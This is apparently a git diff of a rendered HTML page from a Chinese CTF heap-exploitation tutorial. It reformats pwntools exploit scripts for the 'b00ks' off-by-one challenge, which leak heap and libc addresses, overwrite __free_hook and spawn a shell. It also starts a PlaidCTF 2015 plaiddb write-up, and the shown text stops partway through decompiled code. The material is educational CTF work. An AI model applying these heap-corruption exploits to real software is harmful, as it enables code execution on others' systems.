@@ -3570,8 +3570,8 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-plaidctf-2015-datastore-todo" title="实例 2 : plaidctf 2015 datastore (TODO)" class="md-nav__link">
-    实例 2 : plaidctf 2015 datastore (TODO)
+  <a href="#2-plaidctf-2015-plaiddb" title="实例 2 : plaidctf 2015 plaiddb" class="md-nav__link">
+    实例 2 : plaidctf 2015 plaiddb
   </a>
   
     <nav class="md-nav">
@@ -3580,6 +3580,20 @@
           <li class="md-nav__item">
   <a href="#_8" title="功能分析" class="md-nav__link">
     功能分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="漏洞利用分析" class="md-nav__link">
+    漏洞利用分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" title="exploit" class="md-nav__link">
+    exploit
   </a>
   
 </li>
@@ -4845,8 +4859,8 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-plaidctf-2015-datastore-todo" title="实例 2 : plaidctf 2015 datastore (TODO)" class="md-nav__link">
-    实例 2 : plaidctf 2015 datastore (TODO)
+  <a href="#2-plaidctf-2015-plaiddb" title="实例 2 : plaidctf 2015 plaiddb" class="md-nav__link">
+    实例 2 : plaidctf 2015 plaiddb
   </a>
   
     <nav class="md-nav">
@@ -4855,6 +4869,20 @@
           <li class="md-nav__item">
   <a href="#_8" title="功能分析" class="md-nav__link">
     功能分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="漏洞利用分析" class="md-nav__link">
+    漏洞利用分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" title="exploit" class="md-nav__link">
+    exploit
   </a>
   
 </li>
@@ -5093,57 +5121,45 @@ if ( book )
 </pre></div>
 
 <p>为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。</p>
-<div class="codehilite"><pre><span></span>def js(str):
-     return io.recvuntil(str)
+<div class="codehilite"><pre><span></span>io.recvuntil(&#39;Enter author name:&#39;) # input author name
+io.sendline(&#39;a&#39; * 32)
 
-def jsn(num):
-     return io.recvn(num)
+io.recvuntil(&#39;&gt;&#39;) # create book1
+io.sendline(&#39;1&#39;)
+io.recvuntil(&#39;Enter book name size:&#39;)
+io.sendline(&#39;32&#39;)
+io.recvuntil(&#39;Enter book name (Max 32 chars):&#39;)
+io.sendline(&#39;object1&#39;)
+io.recvuntil(&#39;Enter book description size:&#39;)
+io.sendline(&#39;32&#39;)
+io.recvuntil(&#39;Enter book description:&#39;)
+io.sendline(&#39;object1&#39;)
 
-def fs(str):
-     io.sendline(str)
-
-def fsn(str):
-     io.send(str)
-
-js(&#39;Enter author name:&#39;) #input author name
-fs(&#39;a&#39;*32)
-
-js(&#39;&gt;&#39;)# create book1
-fs(&#39;1&#39;)
-js(&#39;Enter book name size:&#39;)
-fs(&#39;32&#39;)
-js(&#39;Enter book name (Max 32 chars):&#39;)
-fs(&#39;object1&#39;)
-js(&#39;Enter book description size:&#39;)
-fs(&#39;32&#39;)
-js(&#39;Enter book description:&#39;)
-fs(&#39;object1&#39;)
-
-js(&#39;&gt;&#39;)# print book1
-fs(&#39;4&#39;)
-js(&#39;Author:&#39;)
-js(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1
-book1_addr=jsn(6)
-book1_addr=book1_addr.ljust(8,&#39;\x00&#39;)
-book1_addr=u64(book1_addr)
+io.recvuntil(&#39;&gt;&#39;) # print book1
+io.sendline(&#39;4&#39;)
+io.recvuntil(&#39;Author:&#39;)
+io.recvuntil(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1
+book1_addr = io.recv(6)
+book1_addr = book1_addr.ljust(8,&#39;\x00&#39;)
+book1_addr = u64(book1_addr)
 </pre></div>
 
 <h4 id="off-by-one_3">off-by-one 覆盖指针低字节<a class="headerlink" href="#off-by-one_3" title="Permanent link">&para;</a></h4>
 <p>程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 pointer array 第一个项的低字节。</p>
 <p>覆盖掉 book1 指针的低字节后，这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book 结构，这个 book 结构的 description 和 name 指针可以由直接控制。</p>
 <div class="codehilite"><pre><span></span>def off_by_one(addr):
-    addr+=58
-    js(&#39;&gt;&#39;)# create fake book in description
-    fs(&#39;3&#39;)
-    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)
-    js(&#39;Enter new book description:&#39;)
-    fs(fake_book_data)      # &lt;== fake book
+    addr += 58
+    io.recvuntil(&#39;&gt;&#39;)# create fake book in description
+    io.sendline(&#39;3&#39;)
+    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)
+    io.recvuntil(&#39;Enter new book description:&#39;)
+    io.sendline(fake_book_data) # &lt;== fake book
 
 
-    js(&#39;&gt;&#39;)# change author name
-    fs(&#39;5&#39;)
-    js(&#39;Enter author name:&#39;)
-    fs(&#39;a&#39;*32)          # &lt;== off-by-one
+    io.recvuntil(&#39;&gt;&#39;) # change author name
+    io.sendline(&#39;5&#39;)
+    io.recvuntil(&#39;Enter author name:&#39;)
+    io.sendline(&#39;a&#39; * 32) # &lt;== off-by-one
 </pre></div>
 
 <p>这里在 description 中伪造了 book ，使用的数据是 p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) 。
@@ -5195,12 +5211,12 @@ book1_addr=u64(book1_addr)
 <div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;info&quot;</span>
 
-<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;b00ks&quot;</span><span class="p">)</span>
-<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
-<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./b00ks&quot;</span><span class="p">)</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;b00ks&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./b00ks&quot;</span><span class="p">)</span>
 
 
-<span class="k">def</span> <span class="nf">createbook</span><span class="p">(</span><span class="n">name_size</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">des_size</span><span class="p">,</span><span class="n">des</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">createbook</span><span class="p">(</span><span class="n">name_size</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">des_size</span><span class="p">,</span> <span class="n">des</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
@@ -5217,14 +5233,14 @@ book1_addr=u64(book1_addr)
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
-        <span class="n">book_id</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">book_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
         <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
-        <span class="n">book_name</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">book_name</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
         <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
-        <span class="n">book_des</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">book_des</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
         <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
-        <span class="n">book_author</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-    <span class="k">return</span> <span class="n">book_id</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span>
+        <span class="n">book_author</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">book_id</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span>
 
 <span class="k">def</span> <span class="nf">createname</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;name: &quot;</span><span class="p">)</span>
@@ -5236,7 +5252,7 @@ book1_addr=u64(book1_addr)
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">editbook</span><span class="p">(</span><span class="n">book_id</span><span class="p">,</span><span class="n">new_des</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">editbook</span><span class="p">(</span><span class="n">book_id</span><span class="p">,</span> <span class="n">new_des</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
@@ -5250,37 +5266,35 @@ book1_addr=u64(book1_addr)
     <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">book_id</span><span class="p">))</span>
 
-<span class="n">createname</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
-<span class="n">createbook</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">)</span>
-<span class="n">createbook</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="mh">0x21000</span><span class="p">,</span><span class="s2">&quot;b&quot;</span><span class="p">)</span>
+<span class="n">createname</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
+<span class="n">createbook</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+<span class="n">createbook</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="mh">0x21000</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">)</span>
 
 
-<span class="n">book_id_1</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span><span class="o">=</span><span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">book1_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_author</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book1_address:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book1_addr</span><span class="p">))</span>
+<span class="n">book_id_1</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span> <span class="o">=</span> <span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">book1_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">book_author</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book1_address:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book1_addr</span><span class="p">))</span>
 
-<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
-<span class="n">editbook</span><span class="p">(</span><span class="n">book_id_1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">changename</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
-<span class="n">book_id_1</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span><span class="o">=</span><span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">book2_name_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
-<span class="n">book2_des_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_des</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 name addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book2_name_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 des addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book2_des_addr</span><span class="p">))</span>
-<span class="n">libc_base</span><span class="o">=</span><span class="n">book2_des_addr</span><span class="o">-</span><span class="mh">0x5b9010</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+<span class="n">editbook</span><span class="p">(</span><span class="n">book_id_1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">changename</span><span class="p">(</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">32</span><span class="p">)</span>
 
-<span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="p">]</span>
-<span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4f322</span> <span class="c1">#0x4f2c5 0x10a38c 0x4f322</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;free_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;one_gadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
-<span class="n">editbook</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
-<span class="n">editbook</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
-<span class="c1">#gdb.attach(io)</span>
+<span class="n">book_id_1</span><span class="p">,</span> <span class="n">book_name</span><span class="p">,</span> <span class="n">book_des</span><span class="p">,</span> <span class="n">book_author</span> <span class="o">=</span> <span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">book2_name_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">book_name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">book2_des_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">book_des</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 name addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book2_name_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 des addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">book2_des_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">book2_des_addr</span> <span class="o">-</span> <span class="mh">0x5b9010</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc base:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
 
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="p">]</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4f322</span> <span class="c1"># 0x4f2c5 0x10a38c 0x4f322</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;free_hook:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;one_gadget:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+<span class="n">editbook</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">editbook</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
 
 <span class="n">deletebook</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-
 
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
@@ -5292,27 +5306,12 @@ book1_addr=u64(book1_addr)
 <div class="codehilite"><pre><span></span>#! /usr/bin/env python2
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
-#
-# Copyright © 2018 anciety &lt;anciety@anciety-pc&gt;
-#
-# Distributed under terms of the MIT license.
+
 import sys
 import os
 import os.path
 from pwn import *
 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
-context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]
-
-# synonyms for faster typing
-tube.s = tube.send
-tube.sl = tube.sendline
-tube.sa = tube.sendafter
-tube.sla = tube.sendlineafter
-tube.r = tube.recv
-tube.ru = tube.recvuntil
-tube.rl = tube.recvline
-tube.rr = tube.recvregex
-tube.irt = tube.interactive
 
 if len(sys.argv) &gt; 2:
     DEBUG = 0
@@ -5327,54 +5326,47 @@ else:
 
     p = process(PATH)
 
-orig_attach = gdb.attach
-def gdb_attach(*args, **kwargs):
-    if DEBUG:
-        orig_attach(*args, **kwargs)
-gdb.attach = gdb_attach
-
-
 def cmd(choice):
-    p.ru(&#39;&gt; &#39;)
-    p.sl(str(choice))
+    p.recvuntil(&#39;&gt; &#39;)
+    p.sendline(str(choice))
 
 
 def create(book_size, book_name, desc_size, desc):
     cmd(1)
-    p.ru(&#39;: &#39;)
-    p.sl(str(book_size))
-    p.ru(&#39;: &#39;)
+    p.recvuntil(&#39;: &#39;)
+    p.sendline(str(book_size))
+    p.recvuntil(&#39;: &#39;)
     if len(book_name) == book_size:
-        p.s(book_name)
+        p.send(book_name)
     else:
-        p.sl(book_name)
-    p.ru(&#39;: &#39;)
-    p.sl(str(desc_size))
-    p.ru(&#39;: &#39;)
+        p.sendline(book_name)
+    p.recvuntil(&#39;: &#39;)
+    p.sendline(str(desc_size))
+    p.recvuntil(&#39;: &#39;)
     if len(desc) == desc_size:
-        p.s(desc)
+        p.send(desc)
     else:
-        p.sl(desc)
+        p.sendline(desc)
 
 
 def remove(idx):
     cmd(2)
-    p.ru(&#39;: &#39;)
-    p.sl(str(idx))
+    p.recvuntil(&#39;: &#39;)
+    p.sendline(str(idx))
 
 
 def edit(idx, desc):
     cmd(3)
-    p.ru(&#39;: &#39;)
-    p.sl(str(idx))
-    p.ru(&#39;: &#39;)
-    p.s(desc)
+    p.recvuntil(&#39;: &#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;: &#39;)
+    p.send(desc)
 
 
 def author_name(author):
     cmd(5)
-    p.ru(&#39;: &#39;)
-    p.s(author)
+    p.recvuntil(&#39;: &#39;)
+    p.send(author)
 
 
 libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
@@ -5383,14 +5375,14 @@ def main():
     # Your exploit script goes here
 
     # leak heap address
-    p.ru(&#39;name: &#39;)
-    p.sl(&#39;x&#39; * (0x20 - 5) + &#39;leak:&#39;)
+    p.recvuntil(&#39;name: &#39;)
+    p.sendline(&#39;x&#39; * (0x20 - 5) + &#39;leak:&#39;)
 
     create(0x20, &#39;tmp a&#39;, 0x20, &#39;b&#39;) # 1
     cmd(4)
-    p.ru(&#39;Author: &#39;)
-    p.ru(&#39;leak:&#39;)
-    heap_leak = u64(p.rl().strip().ljust(8, &#39;\x00&#39;))
+    p.recvuntil(&#39;Author: &#39;)
+    p.recvuntil(&#39;leak:&#39;)
+    heap_leak = u64(p.recvline().strip().ljust(8, &#39;\x00&#39;))
     p.info(&#39;heap leak @ 0x%x&#39; % heap_leak)
     heap_base = heap_leak - 0x1080
 
@@ -5406,7 +5398,6 @@ def main():
     create(0x20, &#39;/bin/sh\x00&#39;, 0x200, &#39;to arbitrary read write&#39;) # 6
 
     edit(4, payload) # overflow
-    gdb.attach(p)
     remove(5) # unlink
 
     edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + &#39;\n&#39;)
@@ -5418,10 +5409,10 @@ def main():
     def read_at(addr):
         edit(4, p64(addr) + &#39;\n&#39;)
         cmd(4)
-        p.ru(&#39;Description: &#39;)
-        p.ru(&#39;Description: &#39;)
-        p.ru(&#39;Description: &#39;)
-        content = p.rl()[:-1]
+        p.recvuntil(&#39;Description: &#39;)
+        p.recvuntil(&#39;Description: &#39;)
+        p.recvuntil(&#39;Description: &#39;)
+        content = p.recvline()[:-1]
         p.info(content)
         return content
 
@@ -5431,13 +5422,13 @@ def main():
     write_to(libc_leak + libc.symbols[&#39;__free_hook&#39;], p64(libc_leak + libc.symbols[&#39;system&#39;]), 0x10)
     remove(6)
 
-    p.irt()
+    p.interactive()
 
 if __name__ == &#39;__main__&#39;:
     main()
 </pre></div>
 
-<h2 id="2-plaidctf-2015-datastore-todo">实例 2 : plaidctf 2015 datastore (TODO)<a class="headerlink" href="#2-plaidctf-2015-datastore-todo" title="Permanent link">&para;</a></h2>
+<h2 id="2-plaidctf-2015-plaiddb">实例 2 : plaidctf 2015 plaiddb<a class="headerlink" href="#2-plaidctf-2015-plaiddb" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span>➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> file datastore
 datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>1a031710225e93b0b5985477c73653846c352add, stripped
 ➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span> checksec datastore
@@ -5451,9 +5442,330 @@ datastore: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version 
 ➜  2015_plaidctf_datastore git:<span class="o">(</span>master<span class="o">)</span>
 </pre></div>
 
-<p>可以看出，该程序是 64 位动态链接的。保护全部开启......</p>
+<p>可以看出，该程序是 64 位动态链接的。保护全部开启。</p>
 <h3 id="_8">功能分析<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<p>待完成。</p>
+<p>关键数据结构：</p>
+<div class="codehilite"><pre><span></span>struct Node {
+    char *key;
+    long data_size;
+    char *data;
+    struct Node *left;
+    struct Node *right;
+    long dummy;
+    long dummy1;
+}
+</pre></div>
+
+<p>主要使用了二叉树的结构来存储数据，具体存储过程其实并不影响利用。</p>
+<p>功能函数需要注意的是 <code>getline</code> (自己实现的单行读取函数):</p>
+<div class="codehilite"><pre><span></span>char *__fastcall getline(__int64 a1, __int64 a2)
+{
+  char *v2; // r12
+  char *v3; // rbx
+  size_t v4; // r14
+  char v5; // al
+  char v6; // bp
+  signed __int64 v7; // r13
+  char *v8; // rax
+
+  v2 = (char *)malloc(8uLL); // 一开始使用 malloc(8) 进行分配
+  v3 = v2;
